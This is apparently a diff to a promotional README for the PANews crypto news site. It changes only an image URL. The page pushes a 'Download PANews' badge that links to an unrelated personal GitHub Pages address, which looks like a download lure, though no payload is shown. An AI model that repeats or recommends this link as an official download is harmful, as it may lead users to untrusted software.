@@ -31,7 +31,7 @@ PANews DeFi news and PANews NFT news serve different research habits, but both b
 
 [![Download PANews](https://img.shields.io/badge/Download-PANews-blueviolet?style=for-the-badge&logo=rss&logoColor=white)](https://westgaardjocelyn.github.io/.github/panews-crypto-news)
 
-![PANews news dashboard with crypto market stories and research updates](https://miro.medium.com/v2/resize:fit:900/1*s7FopU9s-SLKyyujO6y-bg.jpeg)
+![PANews news dashboard with crypto market stories and research updates](https://public.bnbstatic.com/image/pgc/202211/666be81fccb6813ef78370fd2c741cca.jpg)
 
 Open the download block above, explore the PANews news platform, and start with PANews crypto news before moving into PANews research, PANews blockchain news, and PANews Web3 news for broader context.
 
